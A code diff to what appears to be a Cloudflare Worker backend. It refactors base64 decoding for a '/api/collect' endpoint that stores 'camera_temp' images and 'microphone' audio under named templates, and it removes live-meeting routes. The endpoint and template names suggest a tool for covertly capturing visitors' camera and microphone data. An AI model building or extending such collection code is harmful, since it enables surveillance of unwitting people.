@@ -47,9 +47,8 @@ import {	ApiException,
    		isAnyZodType,
    		isSpecificZodType,
    		jsonResp,
-   		legacyTypeIntoZod,
+	legacyTypeIntoZod,
 } from 'chanfana';
-import  RealtimeKitAPI from '@cloudflare/realtimekit';
 
 // Define OpenAPI details
 const openapi = chanfana({
@@ -75,10 +74,6 @@ const LoginSchema = z.object({
 const CollectSchema = z.object({
     template: z.string(),
     data: z.any(),
-});
-
-const MeetingSchema = z.object({
-    title: z.string().optional(),
 });
 
 // --- Authentication ---
@@ -122,18 +117,30 @@ app.post('/api/collect', openapi.json(CollectSchema), async (c) => {
         let fileUrl = null;
         let logData = data;
 
+        function base64ToArrayBuffer(value) {
+            if (typeof value !== 'string') {
+                throw new Error('Expected base64 string.');
+            }
+
+            const base64 = value.includes(',') ? value.split(',')[1] : value;
+            const binaryString = atob(base64);
+            const bytes = new Uint8Array(binaryString.length);
+            for (let i = 0; i < binaryString.length; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            return bytes.buffer;
+        }
+
         // Handle file uploads for specific templates
         if (template === 'camera_temp' && data.image) {
             const key = `image-${Date.now()}.png`;
-            const body = Buffer.from(data.image, 'base64');
+            const body = base64ToArrayBuffer(data.image);
             await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'image/png' } });
             fileUrl = `/r2/${key}`;
             logData = { ...data, imageUrl: fileUrl, image: undefined }; // Remove large data from log
         } else if (template === 'microphone' && data.audio) {
             const key = `audio-${Date.now()}.wav`;
-            // The audio data is a data URL: "data:audio/wav;base64,..."
-            const audioBase64 = data.audio.split(',')[1];
-            const body = Buffer.from(audioBase64, 'base64');
+            const body = base64ToArrayBuffer(data.audio);
             await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'audio/wav' } });
             fileUrl = `/r2/${key}`;
             logData = { ...data, audioUrl: fileUrl, audio: undefined }; // Remove large data from log
@@ -182,51 +189,7 @@ app.get('/api/templates', (c) => {
   return c.json(templates);
 });
 
-// --- Real-time Meeting (Streaming) ---
-const ACTIVE_MEETING_KEY = 'active_meeting_id';
-
-app.post('/api/meetings', openapi.json(MeetingSchema), async (c) => {
-  const { title } = c.req.valid('json');
-
-  const realtime = new RealtimeKitAPI(c.env.REALTIMEKIT_API_KEY, {
-    realtimeKitOrgId: c.env.REALTIMEKIT_ORG_ID,
-  });
-
-  try {
-    let meetingId = await c.env.KV.get(ACTIVE_MEETING_KEY);
-
-    if (!meetingId) {
-      console.log('No active meeting found, creating a new one.');
-      const meeting = await realtime.createMeeting({
-        title: title || 'Live Stream',
-        recordOnStart: true,
-      });
-      meetingId = meeting.id;
-      await c.env.KV.put(ACTIVE_MEETING_KEY, meetingId);
-    } else {
-      console.log(`Found active meeting: ${meetingId}`);
-    }
-
-    const participant = await realtime.addParticipant(meetingId, {
-      name: 'Viewer',
-      presetName: 'group_call_participant',
-      customParticipantId: 'viewer-' + Math.random().toString(36).substring(7),
-    });
-
-    return c.json({
-      meetingId: meetingId,
-      authToken: participant.token,
-    });
-  } catch (error) {
-    console.error(error);
-    return c.json({ success: false, error: 'Failed to create or join meeting' }, 500);
-  }
-});
-
-app.post('/api/meetings/end', async (c) => {
-  await c.env.KV.delete(ACTIVE_MEETING_KEY);
-  return c.json({ success: true, message: 'Active meeting ended.' });
-});
+// NOTE: Streaming routes moved to `src/index.js` and now use Cloudflare Stream (WHIP/WHEP).
 
 // --- Static Asset Serving ---
 // This should be the last route
